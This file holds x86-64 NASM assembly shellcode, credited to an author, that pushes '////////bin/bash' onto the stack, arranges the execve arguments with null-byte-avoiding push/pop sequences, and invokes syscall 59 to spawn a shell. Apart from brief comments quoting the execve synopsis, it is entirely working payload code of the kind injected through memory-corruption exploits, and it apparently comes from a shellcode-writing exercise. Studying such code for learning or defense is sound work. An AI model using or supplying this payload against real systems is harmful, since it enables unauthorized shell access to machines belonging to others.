; author: Chase Hatch

;;; SYNOPSIS
;;;        #include <unistd.h>
;;; 
;;;        int execve(const char *filename, char *const argv[],
;;;                   char *const envp[]);

;;; fgrep execve /usr/include/x86_64-linux-gnu/asm/unistd_64.h
;;; #define __NR_execve				59
;;; __SYSCALL(__NR_execve, stub_execve)


section .text
global _start
_start:

	xor rax, rax
	push rax
	mov rbx, qword 0x687361622f6e6962 	;  hsab/nib 
	push rbx
	mov rbx, qword 0x2f2f2f2f2f2f2f2f 	;  ////////
	push rbx
	; mov rdi, rsp
	push rsp
	pop rdi
	push rax
	push rdi
	; mov rsi, rsp
	push rsp
	pop rsi
	push rax
	;mov rdx, rsp
	push rsp
	pop rdx
	mov al, 59 	;execve
	syscall

	
